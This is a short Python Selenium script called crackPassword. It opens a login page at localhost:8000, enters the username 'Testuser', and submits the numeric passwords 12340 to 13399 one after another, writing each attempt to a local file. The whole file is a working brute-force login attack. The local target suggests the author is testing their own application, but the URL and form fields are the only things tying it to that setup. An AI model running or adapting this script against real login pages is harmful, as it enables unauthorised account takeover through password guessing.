from selenium import webdriver
from selenium.webdriver.common.by import By
import time
import threading


def crackPassword():
    driver = webdriver.Chrome()
    driver.get('http://localhost:8000/login')

    username = driver.find_element(By.ID, 'id_username')
    username.clear()
    username.send_keys('Testuser')

    for i in range(12340, 13400):
        password = driver.find_element(By.ID, 'id_password')
        submit = driver.find_element(By.CLASS_NAME, 'btn-outline-info')
        password.clear()
        password.send_keys(str(i))
        with open('password_file.txt', 'w') as file:
            file.write(str(i))
        submit.click()
    time.sleep(12000)

crackPassword()